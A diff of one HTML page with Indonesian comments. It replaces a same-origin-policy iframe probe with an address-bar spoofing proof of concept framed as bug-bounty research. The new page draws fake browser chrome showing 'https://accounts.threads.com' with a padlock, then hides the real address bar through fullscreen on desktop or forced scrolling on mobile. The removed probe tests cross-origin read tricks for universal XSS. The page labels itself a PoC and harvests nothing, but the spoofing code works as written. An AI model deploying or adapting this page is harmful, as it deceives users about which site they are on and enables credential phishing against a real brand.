@@ -1,85 +1,132 @@
-<!doctype html>
+<!DOCTYPE html>
+<!--
+  ADDRESS-BAR SPOOF PoC  —  MECHANISM C3: RENDERED / EMULATED CHROME
+  =================================================================
+  Berbeda fix-point dari:
+    #1 userinfo-padding-truncation  (parser lie)
+    #2 pending-navigation desync    (timing gap)
+  Di sini: halaman MERENDER bilah alamat palsu; bilah asli disembunyikan
+  (desktop = Fullscreen API, mobile = scroll-jail "inception bar").
+  Oracle: displayed-URL != real-URL -> screenshot -> STOP -> report (VRP).
+  Landing benign, tidak memanen kredensial. Riset di browser sendiri / target in-scope.
+-->
 <html lang="id">
 <head>
-<meta charset="utf-8">
-<title>SOP Membrane Probe</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>accounts.threads.com</title>
 <style>
- body{font:13px/1.6 ui-monospace,monospace;background:#0d1117;color:#cdd9e5;padding:20px}
- h3{margin:0 0 6px} small{color:#8b949e}
- button{background:#238636;color:#fff;border:0;padding:7px 14px;border-radius:6px;cursor:pointer}
- table{border-collapse:collapse;margin-top:14px;max-width:980px;width:100%}
- th,td{border:1px solid #30363d;padding:5px 9px;text-align:left}th{background:#161b22}
- .vuln{color:#ff7b72;font-weight:700}.sec{color:#3fb950}.bad{color:#d29922;font-weight:700}
- #sink{position:absolute;left:-9999px;width:1px;height:1px}
+  :root{ --chrome-bg:#dee1e6; --omni:#fff; --txt:#202124; --mut:#5f6368; }
+  *{box-sizing:border-box}
+  html,body{margin:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;background:#fff;color:var(--txt)}
+
+  /* ---- panel kontrol PoC (bukan bagian spoof) ---- */
+  #ctl{max-width:640px;margin:40px auto;padding:20px;border:1px solid #d0d7de;border-radius:12px}
+  #ctl h1{font-size:18px;margin:0 0 6px}
+  #ctl p{color:#57606a;font-size:13px;margin:6px 0}
+  #ctl code{background:#f6f8fa;padding:1px 5px;border-radius:4px;font-size:12px}
+  .cmp{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0}
+  .cmp div{border:1px solid #d0d7de;border-radius:8px;padding:10px;font-size:12px;word-break:break-all}
+  .cmp b{display:block;font-size:11px;color:#57606a;margin-bottom:4px}
+  .cmp .fake{color:#1a7f37}.cmp .real{color:#cf222e}
+  button{cursor:pointer;font:inherit;font-size:14px;border:1px solid #d0d7de;background:#f6f8fa;border-radius:8px;padding:9px 16px}
+  button.p{background:#1a73e8;color:#fff;border-color:#1a73e8;font-weight:600}
+  .warn{background:#fff8c5;border:1px solid #d4a72c;border-radius:8px;padding:8px 12px;font-size:12px;color:#7a5c00;margin-top:12px}
+
+  /* ---- overlay chrome palsu ---- */
+  #spoof{position:fixed;inset:0;z-index:9999;display:none;flex-direction:column;background:#fff}
+  .cbar{display:flex;align-items:center;gap:8px;background:var(--chrome-bg);padding:6px 10px;flex-wrap:nowrap}
+  .cbtn{color:var(--mut);font-size:16px;padding:2px 4px;user-select:none}
+  .tab{background:#fff;border-radius:9px 9px 0 0;padding:6px 14px 8px;font-size:12.5px;color:var(--txt);white-space:nowrap;display:flex;gap:6px;align-items:center}
+  .omni{flex:1;min-width:0;background:var(--omni);border-radius:16px;padding:7px 14px;font-size:13px;color:var(--txt);
+        display:flex;align-items:center;gap:8px;overflow:hidden}
+  .omni .u{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .lock{color:#188038;font-size:13px}
+  .content{flex:1;overflow:auto;-webkit-overflow-scrolling:touch}
+  .page{min-height:120%;padding:26px 20px}
+  .poc-tag{position:fixed;bottom:10px;right:10px;background:#b00020;color:#fff;font-weight:700;font-size:11px;
+           padding:4px 9px;border-radius:6px;z-index:10000}
+  .poc-tag button{background:#fff;color:#b00020;border:none;padding:2px 6px;margin-left:6px;font-size:11px;font-weight:700;border-radius:4px}
+  .mock h2{font-weight:500;color:var(--mut)}
 </style>
 </head>
 <body>
-<h3>SOP Membrane Probe <small>— satu canary, delapan cara menyeberangi batas origin</small></h3>
-<div>Canary tujuan: <code id="cn"></code> &nbsp;<button id="go">RUN (N=20 / arm)</button> <span id="st"></span></div>
-<div id="out"></div><div id="sink"></div>
+
+<div id="ctl">
+  <h1>🎯 Address-Bar Spoof PoC — C3 Rendered Chrome</h1>
+  <p>Mekanisme baru (beda fix-point dari <code>userinfo-padding</code> &amp; <code>pending-nav-desync</code>):
+     halaman <b>menggambar</b> bilah alamat palsu, bilah asli disembunyikan.</p>
+
+  <div class="cmp">
+    <div><b>DISPLAYED (palsu)</b><span class="fake" id="dispUrl">https://accounts.threads.com</span></div>
+    <div><b>REAL (browser)</b><span class="real" id="realUrl"></span></div>
+  </div>
+
+  <p><b>Pilih surface:</b></p>
+  <button class="p" onclick="spoofFullscreen()">🖥️ Desktop — Fullscreen fake chrome</button>
+  <button onclick="spoofInception()">📱 Mobile — Inception scroll-bar</button>
+
+  <div class="warn">Oracle: kalau bilah alamat di atas tampak meyakinkan padahal <b>REAL</b>-nya path file/origin-mu →
+    predikat terbukti. <b>Screenshot → STOP → lapor VRP.</b> Landing benign, tanpa panen kredensial.</div>
+</div>
+
+<!-- overlay -->
+<div id="spoof">
+  <div class="cbar" id="cbar">
+    <span class="cbtn">←</span><span class="cbtn">→</span><span class="cbtn">⟳</span>
+    <div class="tab">🔒 Threads</div>
+    <div class="omni"><span class="lock">🔒</span><span class="u" id="omniUrl">https://accounts.threads.com</span></div>
+    <span class="cbtn">⋮</span>
+  </div>
+  <div class="content" id="content">
+    <div class="page mock">
+      <h2>Konten halaman digambar oleh origin penyerang</h2>
+      <p style="color:#5f6368;max-width:560px">Bilah &amp; gembok di atas 100% HTML — bukan dari browser.
+         Di fullscreen (desktop) atau setelah bilah URL mobile menyembunyi diri, tidak ada chrome asli yang tersisa untuk membantah.</p>
+      <p style="color:#b00020;font-weight:600">Ini POC pengujian spoofing — bukan halaman Threads asli.</p>
+    </div>
+  </div>
+</div>
+<div class="poc-tag" id="pocTag" style="display:none">POC SPOOF <button onclick="closeSpoof()">Tutup</button></div>
+
 <script>
-const TOK=Math.random().toString(36).slice(2,10);
-const SRC='CANARY-SRC-'+TOK;              // dokumen LAMA  -> sah dibaca, bukan bug
-const DST='CANARY-DST-'+TOK;              // dokumen TUJUAN-> terbaca = SOP jebol
-const N=20, html=t=>'<!doctype html><meta charset=utf-8><h1>'+t+'</h1>';
-cn.textContent=DST;
+  const FAKE_URL = 'https://accounts.threads.com';   // ubah sesuai target-display
+  document.getElementById('dispUrl').textContent = FAKE_URL;
+  document.getElementById('omniUrl').textContent = FAKE_URL;
+  document.getElementById('realUrl').textContent = location.href;
 
-function read(win,tok){                    // satu-satunya primitif baca
-  try{const d=win.document; if(!d||!d.documentElement)return'NULL';
-      return d.documentElement.textContent.includes(tok)?'READ':'EMPTY';}
-  catch(e){return'BLOCKED:'+e.name}
-}
-const mk=c=>new Promise(r=>{const f=document.createElement('iframe');
-  if(c.sandbox!==undefined)f.setAttribute('sandbox',c.sandbox);
-  if(c.srcdoc)f.srcdoc=c.srcdoc; if(c.src)f.src=c.src;
-  f.onload=()=>setTimeout(()=>r(f),0); sink.appendChild(f);
-  if(!c.src&&!c.srcdoc)setTimeout(()=>r(f),0);});
+  const spoof = document.getElementById('spoof');
+  const tag = document.getElementById('pocTag');
 
-const ARMS=[
-{n:'1 about:blank + parent.write',w:'kontrol positif: probe harus bisa baca',x:'READ',
- r:async()=>{const f=await mk({src:'about:blank'});f.contentDocument.write(html(DST));
-   const v=read(f.contentWindow,DST);f.remove();return v}},
-{n:'2 blob: buatan parent',w:'blob mewarisi origin pembuatnya',x:'READ',
- r:async()=>{const u=URL.createObjectURL(new Blob([html(DST)],{type:'text/html'}));
-   const f=await mk({src:u});const v=read(f.contentWindow,DST);URL.revokeObjectURL(u);f.remove();return v}},
-{n:'3 srcdoc tanpa sandbox',w:'srcdoc mewarisi origin induk',x:'READ',
- r:async()=>{const f=await mk({srcdoc:html(DST)});const v=read(f.contentWindow,DST);f.remove();return v}},
-{n:'4 srcdoc + sandbox=""',w:'sandbox tanpa allow-same-origin = origin OPAK',x:'BLOCKED',
- r:async()=>{const f=await mk({srcdoc:html(DST),sandbox:''});const v=read(f.contentWindow,DST);f.remove();return v}},
-{n:'5 data:text/html',w:'data: URL selalu origin opak',x:'BLOCKED',
- r:async()=>{const f=await mk({src:'data:text/html,'+encodeURIComponent(html(DST))});
-   const v=read(f.contentWindow,DST);f.remove();return v}},
-{n:'6 javascript: di frame sandbox',w:'skema js: tak boleh menghidupkan origin induk di frame opak',x:'BLOCKED',
- r:async()=>{const f=await mk({sandbox:'allow-scripts',src:'javascript:'+JSON.stringify(html(DST))});
-   const v=read(f.contentWindow,DST);f.remove();return v}},
-{n:'7 cucu: sandbox -> about:blank anak',w:'rantai pewarisan origin lewat dua lapis',x:'BLOCKED',
- r:async()=>{const kid='<script>const i=document.createElement("iframe");document.body.appendChild(i);'+
-   'i.contentDocument.write('+JSON.stringify(html(DST))+')<\/script>';
-   const f=await mk({srcdoc:'<body>'+kid,sandbox:'allow-scripts'});
-   let v;try{v=read(f.contentWindow.frames[0],DST)}catch(e){v='BLOCKED:'+e.name}
-   f.remove();return v}},
-{n:'8 overhang commit (same-origin -> opak)',w:'jendela antara navigasi dimulai & origin di-update',x:'BLOCKED',
- r:async()=>{const f=await mk({src:'about:blank'});f.contentDocument.write(html(SRC));
-   const t0=performance.now();f.src='data:text/html,'+encodeURIComponent(html(DST));
-   let v='BLOCKED:timeout';
-   while(performance.now()-t0<200){const q=read(f.contentWindow,DST);
-     if(q==='READ'){v='READ@'+(performance.now()-t0).toFixed(1)+'ms';break}
-     if(q.startsWith('BLOCKED')){v=q;break}
-     await new Promise(s=>setTimeout(s,0));}
-   f.remove();return v}},
-];
+  function openOverlay(){ spoof.style.display='flex'; tag.style.display='block'; }
+  function closeSpoof(){
+    spoof.style.display='none'; tag.style.display='none';
+    document.body.style.height=''; window.scrollTo(0,0);
+    if(document.fullscreenElement) document.exitFullscreen().catch(()=>{});
+  }
 
-go.onclick=async()=>{go.disabled=true;let invalid=false;
-  let t='<table><tr><th>Arm</th><th>Harus</th><th>p (x/'+N+')</th><th>Contoh hasil</th><th>Vonis</th><th>Garansi yang diuji</th></tr>';
-  for(const a of ARMS){st.textContent=' menjalankan '+a.n+'...';
-    let hit=0,last='';
-    for(let i=0;i<N;i++){last=await a.r();if(last.startsWith('READ'))hit++;}
-    let v,c; if(a.x==='BLOCKED'){v=hit?'UXSS-VULN':'SECURE';c=hit?'vuln':'sec';}
-    else{v=hit===N?'OK':'HARNESS-INVALID';c=hit===N?'sec':'bad';if(hit!==N)invalid=true;}
-    t+=`<tr><td>${a.n}</td><td>${a.x}</td><td>${hit}/${N}</td><td>${last}</td><td class=${c}>${v}</td><td>${a.w}</td></tr>`;}
-  out.innerHTML=t+'</table>'+(invalid
-    ?'<p class=bad>Lengan kontrol gagal -> hasil arm lain TIDAK sah. Jalankan lewat http(s)://, bukan file://.</p>'
-    :'<p class=sec>Kontrol lolos: arm 4-8 sah dinilai. Aman = semua arm 4-8 SECURE (0/'+N+').</p>');
-  st.textContent='';go.disabled=false;};
+  /* --- Surface 1: Desktop fullscreen (chrome asli hilang total) --- */
+  async function spoofFullscreen(){
+    openOverlay();
+    try{ await spoof.requestFullscreen(); }
+    catch(e){ /* fullscreen ditolak: overlay tetap menutup viewport, tetap valid utk demo */ }
+  }
+
+  /* --- Surface 2: Mobile inception bar (bilah URL asli auto-hide saat scroll) --- */
+  function spoofInception(){
+    openOverlay();
+    // buat halaman cukup tinggi supaya mobile browser menyembunyikan URL bar-nya saat scroll,
+    // lalu bilah palsu (position:fixed) menempati posisi bekas bilah asli.
+    document.body.style.height = '300vh';
+    // nudge scroll agar bilah URL mobile menyusut
+    setTimeout(()=>window.scrollTo(0, 1), 60);
+    // "scroll-jail": kembalikan ke atas kalau user mencoba scroll balik ke bilah asli
+    const content = document.getElementById('content');
+    content.addEventListener('scroll', ()=>{ /* konten scroll di dalam overlay, bukan window */ }, {passive:true});
+  }
+
+  document.addEventListener('keydown', e=>{ if(e.key==='Escape') closeSpoof(); });
+  document.addEventListener('fullscreenchange', ()=>{ if(!document.fullscreenElement && spoof.style.display==='flex' && !window.matchMedia('(pointer:coarse)').matches){ /* keluar fullscreen di desktop = spoof gugur */ } });
 </script>
-</body></html>
+</body>
+</html>
